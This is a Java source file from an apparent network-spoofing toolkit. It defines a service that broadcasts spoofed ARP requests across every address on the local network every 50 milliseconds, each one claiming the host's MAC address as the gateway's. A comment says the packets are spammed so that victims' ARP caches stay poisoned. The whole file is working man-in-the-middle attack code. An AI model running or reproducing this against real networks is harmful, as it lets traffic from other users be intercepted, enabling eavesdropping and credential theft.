package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.util.IpRangeIterator;
import org.bitducks.spoofing.util.IpUtil;
import org.bitducks.spoofing.util.gateway.GatewayFinder;

/**
 * This service broadcast ARP requests on the network to spoof
 * that this computer is the Gateway
 * @author Louis-Étienne Dorval
 */
public class BroadcastARPService extends Service {
	/**
	 * All the informations for the selected interface
	 */
	private InterfaceInfo infoInterface;
	/**
	 * Every IPs for this network
	 */
	private IpRangeIterator ipRange;
	/**
	 * The gateway address
	 */
	private InetAddress gateway;
	
	
	/**
	 * Constructor
	 */
	public BroadcastARPService() {
		super();
		infoInterface = Server.getInstance().getInfo();
		InetAddress firstIp = IpUtil.network(infoInterface.getDevice());
		InetAddress lastIp = IpUtil.lastIpInNetwork(infoInterface.getDevice());
		ipRange = new IpRangeIterator(firstIp, lastIp);
		
		try {
			gateway = GatewayFinder.find(infoInterface.getDevice());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * This method is called when the server start.
	 */
	@Override
	public void run() {
		while(! this.isCloseRequested()){
			broadcastSpoof();
			
			//Waiting 50ms to be sure we don't use all the CPU
			//It need to be fast because each packet sent from the real Gateway 
			//to a victim will reset his ARP cache so we spam it
			try {
				Thread.sleep(50);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	/**
	 * Broadcast an spoofed ARP request 
	 */
	private void broadcastSpoof() {
		ARPPacket spoofedPacket = PacketFactory.arpRequest(infoInterface.getMacAddress(), gateway, getNextIp());
		logger.info("Broadcasting a new spoofed packet!");
		Server.getInstance().sendPacket(spoofedPacket);
	}
	
	/**
	 * @return the next IP in the range
	 */
	private InetAddress getNextIp() {
		if(! ipRange.hasNext()) {
			ipRange.reset();
		}
		return ipRange.next();
	}
}
